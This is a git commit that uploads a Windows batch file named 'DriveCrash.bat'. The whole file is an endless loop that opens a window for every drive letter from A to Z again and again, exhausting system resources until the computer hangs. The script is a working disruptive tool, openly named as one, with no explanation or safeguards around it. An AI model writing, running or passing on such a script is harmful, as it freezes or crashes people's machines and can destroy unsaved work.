f2d233a90ca04db0c763f9c517784dbc4bb9e21a
BerBerOnGithub <86917016+BerBerOnGithub@users.noreply.github.com>
2021-09-17 19:32:02 +0200

    Add files via upload

---
+++ DriveCrash.bat
@@ -0,0 +1,28 @@
+:loop
+start "" a:\
+start "" b:\
+start "" c:\
+start "" d:\
+start "" e:\
+start "" f:\
+start "" g:\
+start "" h:\
+start "" i:\
+start "" j:\
+start "" k:\
+start "" l:\
+start "" m:\
+start "" n:\
+start "" o:\
+start "" p:\
+start "" q:\
+start "" r:\
+start "" s:\
+start "" t:\
+start "" u:\
+start "" v:\
+start "" w:\
+start "" x:\
+start "" y:\
+start "" z:\
+goto loop
